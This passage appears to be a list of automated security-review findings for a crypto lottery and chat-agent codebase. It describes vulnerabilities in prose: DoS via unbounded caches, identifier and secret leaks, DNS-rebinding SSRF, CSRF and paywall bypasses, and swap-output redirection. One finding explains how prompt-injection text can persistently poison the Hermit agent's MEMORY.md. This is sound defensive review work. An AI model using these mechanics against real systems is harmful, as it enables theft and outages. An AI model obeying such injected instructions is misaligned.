description: The commit introduces /api/token/hermit-avatar with attacker-controlled size and signatureText parameters. renderHermitAvatarBuffer normalizes signatureText to 24 characters and size to 64-1024, but then uses the resulting size:signatureText pair as a cache key in a process-global Map with no maximum size, TTL, eviction, or concurrency coalescing. A caller can repeatedly request unique signatureText values, especially at size=1024, forcing expensive Sharp rendering work and permanently retaining each generated Buffer until the serverless instance exits. The endpoint has only a per-IP in-memory rate limit, so a single client can still create many cache entries over time, and distributed clients or additional serverless instances can amplify the attack. This can exhaust memory or CPU for the API function, causing availability degradation.

title: XMTP telemetry leaks user and conversation identifiers
description: The new telemetry payloads for inbound XMTP messages and message outcomes include linkable user identifiers and private routing metadata: senderAddress, senderInboxId, conversationId, messageId, content/client hints, and source hints. emitTelemetryEvent writes the whole payload to application logs whenever ELIZA_TELEMETRY_ENABLED is true and forwards the same JSON to ELIZA_TELEMETRY_WEBHOOK_URL when configured. This can deanonymize private XMTP interactions or disclose which wallet/inbox participated in which conversation to log readers or third-party telemetry sinks. The message body is not included, which limits impact, but the identifiers are still sensitive relationship metadata and should be hashed/redacted or gated behind an explicit privacy-aware telemetry mode.

title: Solana reconcile fallback checkpoints only once per day
description: The newly added /api/keeper/jobs/enqueue-solana-reconcile cron endpoint defaults KEEPER_SOLANA_RECONCILE_CHECKPOINT_PREFIX to YYYY-MM-DD and builds checkpointKey as '<date>:<action>'. The downstream /api/cre/keeper/solana/reconcile endpoint treats a completed workflow+checkpointKey as already_processed and skips execution on later calls. As a result, once a configured action such as relay_entries, settle_fees, or winner_relay completes early in the day, all later 15-minute fallback runs for that same action are skipped until the next UTC day. For relay_entries this can leave later Solana lottery entries unrelayed for many hours; because the relay code shows a bounded pending-entry buffer of 256 entries, an attacker can amplify this by submitting entries after the first daily checkpoint and causing delayed processing or buffer pressure/overflow while the CRE-independent fallback is supposed to be providing continuity.

title: Public waitlist endpoint leaks and rewrites lead records
description: The commit adds a public waitlist lead API backed by a unique email constraint. The handler accepts any POST without authentication, performs an INSERT ... ON CONFLICT (email) DO UPDATE, and returns status 'new' versus 'updated' based on whether the row was inserted. An attacker can submit arbitrary email addresses to enumerate which addresses are already in the waitlist/lead database. For existing addresses, the same request also rewrites attacker-controlled fields such as role, x_handle, session_id, and some attribution values, corrupting operational/marketing data for that person. Public lead collection can be unauthenticated, but it should not disclose conflict state or allow unauthenticated updates to records keyed only by email.

title: CF challenge path disables AlfaClub live fallback
description: The commit adds a special `cf_challenge` branch for AlfaClub room-history failures. In that branch, the bridge logs and persists the CF challenge, calls `applySocketBackoff`, marks `liveFallbackActive`, and immediately returns with zero processed commands. Unlike the auth-failure branch just below it, it does not call `ensureLiveCommandSocket`, does not drain `liveCommandQueue`, and does not execute queued live commands. As a result, if room-history HTTP requests are repeatedly challenged by Cloudflare while the WebSocket path is still usable, the bridge enters a live-fallback state that never actually processes fallback messages. Calling `applySocketBackoff` makes this worse because later attempts to open the live socket are suppressed until the backoff expires. Under the repository threat model, external API/proxy responses are attacker-controlled; a malicious or compromised upstream/proxy, or a sustained WAF challenge condition, can therefore cause a persistent availability loss for AlfaClub slash-command execution.

title: Runbook may leak decrypted Vercel production secrets
description: The commit changes the Vercel env update procedure from local-only verification to evidence capture. `vercel env pull` writes a local dotenv file containing decrypted values for all production variables, not only `LOTTERY_AMOE_ROUTER`. The same document identifies `AMOE_LEDGER_PUBLISHER_PRIVATE_KEY` as a production secret. By instructing operators to capture the pre-mutation pull for broadcast evidence, and only deleting the file after evidence capture, the runbook can cause decrypted production secrets to be copied into evidence artifacts or follow-up PR material. This is a process/documentation vulnerability rather than an application-code bug, but it can still expose privileged operational credentials if followed literally. The safer procedure would capture only redacted metadata for the single target variable, e.g. variable name, length, hash, and post-update address, and explicitly forbid storing or committing the pulled dotenv file.

title: Unbounded error-body read can hang AlfaClub bridge
description: The new `extractRoomHistoryErrorDetail` helper calls `await response.text()` with no byte limit. In `fetchRoomHistory`, the abort timeout is cleared as soon as `fetch()` resolves, which normally occurs once response headers are received, before the body is consumed. Therefore, on a non-2xx response, a malicious or faulty AlfaClub API/proxy can stream an arbitrarily large or never-ending body and the bridge will keep buffering it to build a diagnostic string that is later truncated to 200 characters. This can cause memory exhaustion or make `/api/v1/alfaclub/chat-bridge-run` hang/fail during cron execution. The body should be read through a capped stream reader and/or under the same abort timeout before creating the diagnostic excerpt.

title: AMOE guard leaks RPC secrets and checks stale selectors
description: The workflow explicitly allows operators to supply a private RPC endpoint, passes that value to the new shell script, and the script prints the full RPC URL in normal and error logs. If an operator uses an Alchemy/Infura/private-node URL containing an API key or credentials, that secret is written to Actions logs visible to anyone with log access, and potentially public if the repository/workflow logs are public. In the same new guard, the selector list is also stale: it checks setAuthorizedAmoeRelayer(address,bool), authorizedAmoeRelayer(address), and processAmoeEntry((address,bytes32,bytes32,uint256,uint256)), but the checked-out CreatorLotteryManager exposes setAuthorizedAmoeRelayer(address), the zero-argument public getter authorizedAmoeRelayer(), and processAmoeEntry(address,address,uint256). This makes the pre-broadcast guard unreliable or unusable for the actual manager surface it is supposed to verify.

title: Broad gitleaks allowlist hides generic env secrets
description: The new rule-scoped allowlist suppresses the default `generic-api-key` detector for both `secrets.example.env` and any future file matching `[A-Za-z0-9_-]+.example.env`. Although provider-specific detectors still run, many operational secrets in this repository are generic service keys or app secrets that are primarily caught by the generic detector, such as keeper API keys, DefiLlama keys, Privy secrets, or internal webhook tokens. Because the security-scanning workflow runs gitleaks with this repository config, a real generic credential accidentally or maliciously committed in `cre/secrets.example.env` or another `*.example.env` file could pass the main configured CI secret scan.

title: Shared AMOE debit helper marks legacy burns refundable
description: The new `amoe_burn_credits_intents` table is supposed to distinguish phase-A `/burn-credits` debits from legacy `/amoe/submit` debits. However, the marker insert was placed unconditionally inside `consumeAmoeCreditsForEntry`, which is also called by the legacy `/api/v1/lottery/amoe/submit` handler after a successful on-chain relay. The refund cron then treats any old negative `amoe_entry_spend` row with a matching intent and no settled `amoe_zk_submissions` row as an orphan. Legacy direct submits do not create `amoe_zk_submissions`, so newly successful legacy entries will receive intent rows and later be refunded despite already having been submitted on chain. This allows AMOE credits to be duplicated/recycled into additional lottery entries when the refund cron is enabled.

title: Refund cron restores credits for in-flight AMOE burns
description: The refund selection query only checks that there is no `amoe_zk_submissions` row with `state = 'settled'`. However, the replay store explicitly has non-settled transient states such as `pending`, `proven`, `broadcast`, and `manager_declined`; absence of a `settled` row is not the same as proof that phase B never ran or that no on-chain entry can still settle. For example, if a submission is left in `broadcast` because the server failed before `markSettled`, or another in-flight/retry state remains stale past the TTL, the new cron will insert a positive `amoe_entry_refund` row. The migration then makes that source count fully toward AMOE eligible balance. This creates a state-desynchronization path where a user can regain off-chain credits while the original submission is still in the phase-B pipeline or has already landed on-chain but was not marked settled in the DB. The refund logic should exclude any burn that has an active/in-flight submission, and ideally require either no submission row at all or only terminal, provably non-settled rows; submit/retry paths should also reject or account for refunded spendRefIds.

title: Long spendRefId makes AMOE burns unprojectable
description: PR 5b relies on points.source_id exactly matching amoe_zk_submissions.spend_ref_id so defaultLookupBurnContext can recover the wallet and twitter-credit nullifier for each debit. However, _amoeSubmitZk only checks that spendRefId is non-empty and stores the unmodified value in amoe_zk_submissions. Later, the same value is passed to consumeAmoeCreditsForEntry as refId, but consumeAmoeCreditsForEntry calls normalizeRefId(), which truncates refIds to 190 characters before inserting points.source_id. For any spendRefId longer than 190 characters, the points row contains the truncated value while the submission row contains the full value. The publisher's exact equality join then returns no row, projectAmoeBurnsToLedger treats the debit as missing context, and the epoch snapshot can be built/published from a partial ledger. This is attacker-controllable because spendRefId is request body input.

title: Chat Ethos badges leak private DM peer addresses
description: The commit adds Ethos score components that hydrate scores by calling `/api/v1/chat/search?q=<address>`. These components are now rendered for recent XMTP conversations, the chat bar conversation list, and open chat windows. As a result, simply viewing chat UI causes private DM peer addresses to be sent to the 4626 API. Because `apiFetch` attaches the user's SIWE bearer token when present, the backend request can be correlated to the logged-in user. The search handler then calls `getCachedEthosScoreByAddress`, which fetches `https://api.ethos.network/api/v2/score/address?address=<peer>`, disclosing the peer addresses to an external service on cache misses. XMTP conversations are otherwise client-side/private metadata, so automatic score hydration leaks a user's social graph/contact metadata without explicit search intent or consent.

title: Unauthenticated Hermit health endpoint leaks runtime state
description: The commit adds a new long-lived Hermit HTTP health server. Any network client that can reach the service can request GET or HEAD /healthz or /readyz and receive the full RuntimeState object. That state includes the configured AlfaClub room id, startup/readiness reason, last tick metadata, recent message processing counts, recent message ids associated with errors, and internal error strings. The existing Eliza runtime has a split between minimal public health output and token-gated detailed output, but the new Hermit endpoint returns details unconditionally. If the Railway service is publicly reachable, this becomes an unauthenticated operational information leak that can help attackers identify the active room, monitor command activity, and learn integration/configuration failures for follow-on targeting.

title: User prompts can persistently poison Hermit memory
description: The new dialect persistence flow is implemented as instructions to the external agent, not as deterministic host-side code. A user-controlled flag or broad text hint causes the prompt to tell the agent to use its file edit tool to update workspace MEMORY.md before returning JSON. The same prompt later includes the raw user input. If a user includes a dialect trigger plus prompt-injection text, the model may be induced to write more than the intended enum bullet into MEMORY.md. The new seed files then instruct the agent to re-read MEMORY.md on future conversations and apply its contents. This creates a persistent prompt-injection/state-poisoning path across turns, and likely across users sharing the same Pinata workspace/session, despite the endpoint being intended as a read-only Hermit lane. The safer design is to persist dialect preferences host-side using validated enum values and per-user/per-room scope, or to hard-restrict any agent file edit tool to an exact path and exact replacement that cannot be influenced by user text.

title: Unsanitized DB error details can leak AlfaClub tokens
description: The new describeDbError helper claims to be redacted, but it copies err.message and err.detail directly into structured logs. PostgreSQL error detail fields can include the full failing row for constraint/domain/check failures, and custom triggers or schema drift can also put parameter values into error text. These upsert paths insert sensitive AlfaClub JWTs, Privy access tokens, and Privy refresh tokens into the secret_value column, then log the DB error fingerprint on failure. Under a DB/schema error that includes the failed row, the token material can be written to general observability logs. This is especially risky for the Privy refresh token because it may be short enough to fit within the 200-character detail slice.

title: Ceremony setup script skips ptau checksum verification
description: In `circuits/amoe/ceremony/v2/scripts/00-setup.sh`, the script verifies only that `pot14_final.ptau` exists, then immediately runs `snarkjs groth16 setup` with that file. There is no SHA-256 validation against the manifest-pinned value. This is inconsistent with the runbook/manifest expectations and creates a fail-open path where a substituted or corrupted ptau can be used for ceremony generation. If an attacker can tamper with the ptau source/file (supply-chain/local tampering/social engineering), the generated proving/verifier artifacts may be based on untrusted parameters, undermining trusted-setup integrity and potentially enabling forged proofs depending on trapdoor knowledge.

title: Session cookies widened to parent domain enable subdomain theft
description: Before this commit, session cookies were host-only. The new logic auto-resolves production hosts to `.4626.fun` and always emits that `Domain` attribute when setting cookies. This means authenticated session cookies are now sent to *every* `*.4626.fun` host, not just the app host. If an attacker can control or compromise any sibling subdomain (e.g., misconfigured DNS/CNAME takeover, compromised marketing subdomain, or vulnerable service under the parent zone), they can receive users' session cookies in HTTP requests and replay them against app APIs. This is a trust-boundary expansion of authentication material and weakens compartmentalization between subdomains.

title: AMOE path trusts relayer input for entry value and eligibility
description: This commit introduces `processAmoeEntry`, which gates access to a single `authorizedAmoeRelayer` but does not verify that `pointsBurnedAsUSD` corresponds to any on-chain points burn or authenticated user entitlement. The relayer can choose arbitrary `buyer`, `creatorCoin`, and `pointsBurnedAsUSD`, and that value is fed directly into win-chance calculation / VRF dispatch. As a result, compromise or abuse of that one relayer authority can generate unlimited high-probability entries (up to configured caps), materially increasing jackpot-drain risk and potentially exhausting sponsored VRF budget. The trust model is documented, but from a security perspective this is a newly introduced single-key failure mode on a value-bearing path.

title: Phase3 deploy gating accepts unpaid pending feature activations
description: The v2 deploy-session create flow now enforces a phase3 strategy paywall using listActiveCreatorFeatureKeys. That helper considers any activation row with status "pending" as eligible and does not require payment_verified_at. Pending rows are created immediately when a checkout is started (before payment clears), so an attacker can start a checkout to get a pending row and then submit phase3Calls to deploy paid strategies without paying. This is an authorization/entitlement bypass of paid deploy features and undermines revenue controls.

title: Stripe checkout pending rows bypass strategy paywall gating
description: The new paymaster enforcement for Phase3 strategy weights resolves the creator’s paid plan from the database and treats any activation with status `pending` as paid. Stripe checkout sessions insert a `pending` row before payment is verified (payment_verified_at is still NULL). An authenticated user can therefore call `/api/creator/strategy/stripe/checkout` to create a pending activation without paying, then submit a Phase3 deploy with nonzero weights for that feature. The paymaster accepts the request because `resolveCreatorStrategyPlan` includes the unpaid pending row, enabling free activation and subsidized onchain deployment. The fix is to only count activations with `payment_verified_at IS NOT NULL` (or introduce a separate status for unverified Stripe sessions).

title: Keepr trust zone auth bypass if zone key env unset
description: The commit adds a conditional guard around trust-zone authentication in `/api/keepr/actions/execute`. Instead of always calling `requireOptionalHeaderEnvAuth` (which fails closed when the env var is absent), it only enforces the header check when a zone secret is present. If a deployment forgets to set the per-zone key, requests with only the global KEEPR_API_KEY can execute actions across all trust zones, weakening authorization for financial or operational actions.

title: Auth resolver ignores merged profile tombstones
description: The commit introduces `profiles.merged_into_profile_id` to tombstone merged profiles, but the wallet authorization resolver still selects from `profiles` without filtering out tombstones or following the merge pointer. Because `resolveAuthorizedRequestPrincipal` relies on this resolver, a wallet linked to a merged-away profile can still authenticate as the tombstoned profile. This undermines the merge invariant and can allow users to bypass canonical identity constraints (e.g., per-profile limits, rewards, or audit trails) by continuing to operate on the merged profile.

title: CSRF guard weakened by trusting marketing origin/header bypass
description: The commit expands trusted request origins to include hard-coded marketing domains and adds a bypass in enforceCookieSessionTrustedOrigin that disables origin checks whenever a non-empty X-Privy-Token or X-SIWA-Receipt header is present. Because these headers are not validated in the guard and cookies are still used for authentication downstream, any script executing on a whitelisted origin (including the marketing site or any CORS-allowed host) can attach a dummy header and trigger state-changing API calls using the victim’s session cookies. This weakens CSRF protections for cookie-authenticated endpoints and broadens the trusted origin surface without additional verification.

title: External swap allows keeper to redirect swap output to attacker
description: `convertViaExternalAndQueue` approves a spender and executes `swapTarget.call(swapCallData)` with caller-supplied calldata. The function only validates that (a) the net tokenIn spend is ≤ amountIn and (b) the router’s creatorCoin balance increases by at least `minCreatorOut`. There is no enforcement that the swap output is routed back to the PayoutRouter or that the output corresponds to `amountIn`. With allowlisted swap targets such as universal routers that allow arbitrary recipients, a keeper can split swaps or direct outputs to their own address while sending a dust amount to the router, satisfying `minCreatorOut` and draining router-held payout tokens. This expands keeper power beyond the previous V3-only path that always set the recipient to the router.

title: LP reserve sweep can be triggered before sweep window
description: The new 40/40/20 split sends the LP reserve directly to the CCA strategy before the deferred auction is launched. However, the strategy’s residual sweep functions only enforce block.number >= lastSweepBlock, and lastSweepBlock is only set when _launchAuctionInternal runs. Until launch, lastSweepBlock defaults to 0, so an operator can call sweepResidualAuctionToken/sweepResidualCurrency immediately and drain the LP reserve (or other prefunded balances), undermining the intended migration reserve and potentially preventing successful migration.

title: ERC-8004 paid review fetch allows DNS-rebinding SSRF
description: The new /api/v1/agents/feedback/review handler accepts registrationUrl/endpoint inputs and passes them into the ERC-8004 review builder, which fetches those URLs. The SSRF guard only performs a DNS lookup before issuing fetch() on the hostname, without pinning the resolved IP or using a custom lookup for the request. An attacker can use DNS rebinding (return a public IP for the pre-check, then a private/internal IP for the actual fetch) to reach internal services such as metadata endpoints or private admin interfaces. This is introduced with the new review service.

title: Policy checks in swap_5792/7702 can be bypassed by extra quotes
description: The new server-side guardrails for /api/uniswap/swap5792 and /api/uniswap/swap7702 pick the first non-null quote object (classicQuote/wrapUnwrapQuote/bridgeQuote/priorityQuote) and validate token/routing policy only against that single object. The handler then forwards the full request body unchanged to the Uniswap Trading API. An attacker can include an allowlisted/allowed quote in the first field while also supplying a disallowed quote in another field (or override the routing field inside the quote object), so the policy check passes but the upstream API may execute the disallowed quote. This undermines the new token/route restrictions and allows policy bypass for disallowed routes or tokens.

title: Delayed remote lottery entry allows price‑timing manipulation
description: The commit replaces immediate cross‑chain lottery entry submission with a queued entry that the buyer later submits. The queued data stores only buyer and amount, with no timestamp or price snapshot. When the hub processes the entry it recalculates swapValueUSD from the current oracle price. This lets users wait for a favorable price (or manipulate the oracle) before submitting, increasing win probability or bypassing minimum swap thresholds relative to the original trade, potentially draining lottery reserves or skewing payouts.

title: On-chain owner fallback bypasses profile linkage revocation
description: The updated ownership check now accepts any address that is an on-chain owner of the smart wallet when the profile linkage lookup fails (DB unavailable, canonical wallet not verified, owner/session not linked). This bypasses the off-chain linkage and revocation logic: a wallet removed from the profile (or never linked) can still create deploy sessions as long as it remains an on-chain owner. Deploy sessions grant access to server-driven UserOps and paymaster sponsorship, so this weakens intended access controls tied to profile linkage and can enable unauthorized deployment flows for previously revoked or unverified owners.

title: AlfaClub avatar bypasses image proxy
description: SelectedRoomAvatar now trims room.imageUrl and assigns it directly to an . These image URLs originate from AlfaClub metadata and are later returned from the database without URL or MIME validation. The repository already contains a hardened /api/image/external proxy that restricts schemes, blocks private hosts, follows redirects safely, caps image size, and verifies image MIME/magic bytes. Bypassing that proxy means a room metadata controller can cause visitors to fetch attacker-controlled allowlisted image URLs directly from their browser, exposing client IP/User-Agent/origin referrer to that host and bypassing the proxy's size and content-type checks. Production CSP limits this to img-src allowlisted/data/blob sources, so this is a low-impact privacy/resource-exhaustion regression rather than an asset-loss issue.

title: Bootstrap preflight can skip RLS hardening
description: The changed schema bootstrap code now treats the mere existence of alfaclub.market_feature_snapshots, alfaclub.decision_ledger, and alfaclub.decision_outcomes as proof that their migrations are fully applied. However, ensureMigrationApplied returns immediately and records the migration in the durable ledger when the preflight returns true. The skipped migration files contain security hardening statements that enable row-level security and revoke access from anon/authenticated roles. In a drifted, partially bootstrapped, or manually created database where these tables already exist but RLS/grants are not hardened, this commit prevents the hardening statements from ever running and permanently marks the migrations as applied. That can expose the full decision ledger, including raw source identifiers, source position details, market state/evidence JSON, and outcomes, or market feature snapshots through Supabase/PostgREST roles that should have been revoked.

title: AMOE tx-hash matches are dropped by address normalizer
description: fetchAmoeSubmissionMatches() correctly selects lower(tx_hash) from amoe_zk_submissions and later classifyEntryFromAmoeStore() expects matches.txHashes to contain normalized 32-byte transaction hashes. However, the row-processing loop calls normalizeAddress(row.tx_hash), whose regex only accepts 20-byte Ethereum addresses. A normal 0x-prefixed 32-byte transaction hash is therefore rejected and never added to the txHashes set. If manager_entry_id is not available or not yet backfilled, the AMOE store match is lost. The fallback transaction classifier only inspects the top-level from/to/input; AMOE submissions sent via account abstraction or other relays may have top-level from/to pointing to a bundler/EntryPoint rather than the AMOE router or relay wallet, so they fall through to 'swap'. This corrupts the public recentEntries feed and can let AMOE/free entries appear as paid swap demand to agent or analytics consumers.

title: Railway production IDs exposed in operator runbook
description: The updated runbook now contains the concrete Railway project, environment, and service UUIDs for the production XMTP/Keepr agent, plus GraphQL mutations that target those IDs and set the protocol CSW Privy wallet ID before redeploying the service. These values are not sufficient by themselves to authenticate to Railway or Privy, so this is not a direct takeover. However, committing them exposes internal deployment topology and exact production resource identifiers to anyone with repository access, reducing the effort needed for targeted abuse if a Railway token is later leaked and aiding phishing/reconnaissance against the production service.

title: Public docs expose unresolved critical audit findings
description: The docs-site allowlist and sidebar now make the Fable audit report and transcript archive publicly reachable. The published report does not merely summarize remediated findings: it states that multiple critical findings are VERIFIED, gives affected files/functions and exploit mechanics, says C-2/C-3 are new and not previously disclosed, and concludes that these paths should not go to production unaddressed. The export script also stages the original 4626 JSONL transcript tree into a static ZIP and links it as the complete raw archive, which can include tool outputs and operational context that the Markdown export intentionally omits. If these findings are still present in deployed or soon-to-be-deployed code, this commit provides unauthenticated attackers or semi-trusted operators with actionable exploit guidance before remediation or controlled disclosure.

title: Docs build downgrades gray-matter YAML parser
description: The docs-site package-level pnpm override for js-yaml was removed, and the regenerated lockfile now resolves gray-matter@4.0.3 to js-yaml@3.14.2. The docs tooling parses Markdown/MDX front matter with gray-matter during sync and hygiene/build workflows. This is a security regression because it reintroduces an older YAML parser on a path that processes repository documentation content, including content that may be built in CI or preview environments. Restoring the js-yaml override, or upgrading gray-matter/Docusaurus dependencies so all YAML parsing resolves to the hardened js-yaml version, would avoid this downgrade.

title: OVault delegate guard misses whitespace calls
description: The commit adds `scripts/check-ovault-delegate-epilogues.mjs` as a security CI guard to prevent `nonReentrant` external/public CreatorOVault functions from calling `_delegate()`, because `_delegate()` uses assembly `return` and skips the `nonReentrant` modifier epilogue. However, the detector first searches each line with `line.indexOf('_delegate(', pos)`. Solidity permits whitespace or comments between an identifier and `(`, e.g. `_delegate (_coreModule);` or `_delegate /*x*/ (_coreModule);`. Those forms are normalized enough to compile, but they do not contain the exact substring `_delegate(`, so the scan exits before applying its later optional-whitespace regex. I verified with a synthetic change to `queueWithdrawal` using `_delegate (_coreModule);` that the new guard still reports success. This does not introduce a runtime vault bug in the current checked-out Solidity code, but it introduces a bypass in a security control that is explicitly intended to prevent a P1 permanent DoS regression.

title: Arena trade failures leak raw command details to chat
description: The new trade error path calls summarizeArenaRunFailure(result.run) and includes the returned string in the user-visible reply. summarizeArenaRunFailure selects the first non-empty value from run.error, run.stderr, and run.stdout and returns its first line without redacting paths, environment-like values, or other sensitive output. The underlying Arena command wrapper can place internal details into run.error; for example, ENOENT errors include resolvedCommand and cwd absolute paths. Unlike nearby code that uses sanitizeArenaOutputForReply to redact dgclaw paths and ARENA_* assignments, this new trade branch exposes the raw summary. /arena is operator-gated, but in AlfaClub rooms the reply is still posted back to the room/chat surface, so failures can leak deployment paths or child-process diagnostic output beyond the server operator boundary.

title: Public route exposes counter-trade operational inventory
description: A new `/arena/counter-trade-files` route is registered in the marketing/public route tree and renders `counterTradeFileGroups` directly to the browser. The rendered inventory discloses implementation details for the inverse/counter-trade bot, including core execution modules, market/execution dependencies, database migration names, operator scripts/runbooks, admin UI paths, and API handler names such as the cron/manual run endpoint. While the listed endpoints still appear to require their own authentication, publishing this operational map materially reduces attacker reconnaissance effort and can aid targeted probing of high-trust automation surfaces.

title: User-silo alert cooldown is shared across wallets
description: The commit adds alert-only user-silo defense for cases where no Hyperliquid API-wallet key is configured. However, the anti-spam state is a process-global Map keyed as `silo|coin|action.type`. Because user-silo defense is run per active opt-in and the key omits `roomId`, `senderAddress`, and the protected master wallet address, the first alert for e.g. `user|BTC|defend_reduce` suppresses all subsequent BTC defense alerts in the same process for 30 minutes, even if they are for a different user wallet. In multi-actor rooms, a malicious or simply earlier-scanned opt-in can trigger an alert on the same coin/action and prevent the custodied victim wallet from receiving its manual liquidation-defense advisory during the cooldown. The cooldown should be scoped to at least `(roomId, protected wallet or senderAddress, silo, coin, action type)`, and preferably side as well; the cooldown should also be set after the alert is successfully posted if the alert is the only safety action.

title: Keyboard token selector can choose a different token
description: The commit adds a display-only regrouping that moves creator/content/share tokens with positive balances into a new top-level "Your holdings" section. However, the keyboard handler still selects from `visibleRows`, which remains the original `rows` order, while rendering computes the highlighted row index from `displaySections`. When regrouping moves any row, the highlighted token and the token selected by Enter can diverge. Mouse clicks are unaffected because they close over the rendered option, but keyboard users can accidentally select a different swap token than the one visibly highlighted. If an attacker can get a creator/content token with a dust balance into the victim's visible token list, this can be used as a low-severity UI integrity issue to steer a user toward preparing a swap with an unintended token. The same regrouping can also create duplicate "Your holdings" sections when an original holdings section already exists.

title: Airdropped Zora holdings bypass custom-token warning
description: This commit adds a new holdings-backed token source for the swap selector. The hook fetches Zora creator/content/trend holdings for the balance owner, marks them as `isUserHolding`, merges them into the selectable token list, and resolves their `verified` status. The holdings DTO conversion sets Zora creator/content/trend tokens to `verified: true`, and the selector only shows the “Use unverified token?” confirmation when `option.verified === false`. As a result, an attacker who creates a Zora coin and transfers dust to a victim’s CSW/wallet can cause that token to be displayed in the dedicated “Your holdings” section as a normal Creator/Content/Trend token, bypassing the warning that raw address/custom tokens receive. Exploitation still requires user interaction and a signed swap, so this is primarily a token-list poisoning / UI integrity issue rather than a direct custody bypass.

title: Host chat markers can be spoofed by message volume
